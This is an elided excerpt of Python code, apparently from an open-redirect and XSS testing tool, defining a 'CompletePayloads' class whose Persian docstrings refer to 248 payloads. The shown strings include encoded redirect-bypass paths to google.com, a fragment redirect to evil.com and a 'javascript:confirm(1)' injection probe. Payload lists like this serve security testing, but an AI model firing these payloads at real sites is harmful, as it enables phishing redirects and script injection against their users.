...
class CompletePayloads:
    """تمام 248 payload اصلی شما"""
    
    @staticmethod
    def get_all_original_payloads():
        """تمام payload های اصلی شما - لیست کامل"""
        return [
            "/%09/google.com",
            "/%2f%2fgoogle.com",
    ...
    @staticmethod
    def get_context_payloads(context):
        ...
        if context == 'javascript':
            ...
            return CompletePayloads.get_web3_payloads()
        elif context == 'fragment':
            return ["#//evil.com", "#javascript:confirm(1)"]
        else:
            return CompletePayloads.get_all_original_payloads()[:20]